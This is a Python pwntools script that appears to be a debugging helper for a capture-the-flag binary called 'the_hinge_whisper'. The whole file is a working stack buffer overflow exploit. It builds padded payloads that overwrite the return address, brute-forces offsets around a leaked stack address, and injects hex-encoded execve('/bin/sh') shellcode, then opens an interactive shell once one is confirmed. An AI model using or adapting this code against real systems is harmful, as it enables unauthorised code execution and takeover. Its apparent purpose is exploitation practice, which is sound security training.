#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = 'info'

def test_local():
    """Test locally with different payload patterns"""
    
    tests = [
        ("A*72 + B*8 (80b)", b'A'*72 + b'B'*8),
        ("A*64 + B*8 + C*8 (80b)", b'A'*64 + b'B'*8 + b'C'*8),
        ("A*80 (80b)", b'A'*80),
    ]
    
    for name, payload in tests:
        print(f"\n=== Test: {name} ===")
        
        try:
            p = process('./the_hinge_whisper')
            p.recvuntil(b"The keyway sits at: ")
            leak = p.recvline().strip()
            print(f"Leak: {leak}")
            
            p.sendafter(b"Forge your latch-key: ", payload)
            
            try:
                response = p.recv(timeout=2)
                print(f"Response: {response}")
            except EOFError:
                print("EOF - program crashed or exited")
            
            p.close()
        except Exception as e:
            print(f"Error: {e}")

def test_offsets():
    """Test different return address offsets"""
    
    io = process('./the_hinge_whisper')
    io.recvuntil(b"The keyway sits at: ")
    leak = int(io.recvline().strip(), 16)
    print(f"Base leak: {hex(leak)}")
    io.close()
    
    for offset in range(-32, 33, 8):
        target = leak + offset
        print(f"\nTrying offset {offset}: {hex(target)}")
        
        payload = b'\x90'*72 + p64(target)
        
        try:
            io = process('./the_hinge_whisper')
            io.recvuntil(b"The keyway sits at: ")
            io.recvline()
            io.sendafter(b"Forge your latch-key: ", payload)
            
            io.sendline(b'echo TEST123')
            response = io.recv(timeout=1)
            if b'TEST123' in response:
                print(f"SUCCESS! Offset {offset} works!")
                io.interactive()
                return
            io.close()
        except:
            pass
    
    print("No offset worked")

def test_shellcodes():
    """Test different shellcodes"""
    
    shellcodes = [
        ("execve /bin/sh (31b)", bytes.fromhex("4831f04831ff4831f64831d248bb2f62696e2f2f736856534889e7b03b0f05")),
        ("execve /bin/sh (23b)", bytes.fromhex("4831f648bb2f62696e2f2f736852534889e7545f99b03b0f05")),
        ("int3 breakpoint (1b)", b'\xcc'),
        ("infinite loop (2b)", b'\xeb\xfe'),
    ]
    
    for name, sc in shellcodes:
        print(f"\n=== Testing {name} ===")
        
        try:
            io = process('./the_hinge_whisper')
            io.recvuntil(b"The keyway sits at: ")
            leak = int(io.recvline().strip(), 16)
            
            payload = sc + b'\x90'*(72-len(sc)) + p64(leak)
            io.sendafter(b"Forge your latch-key: ", payload)
            
            import time
            time.sleep(1)
            
            try:
                io.sendline(b'test')
                response = io.recv(timeout=1)
                print(f"Response: {response}")
            except EOFError:
                print("EOF - crashed")
            
            io.close()
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "local":
            test_local()
        elif sys.argv[1] == "offsets":
            test_offsets()
        elif sys.argv[1] == "shellcodes":
            test_shellcodes()
    else:
        print("Usage: python3 debug.py [local|offsets|shellcodes]")
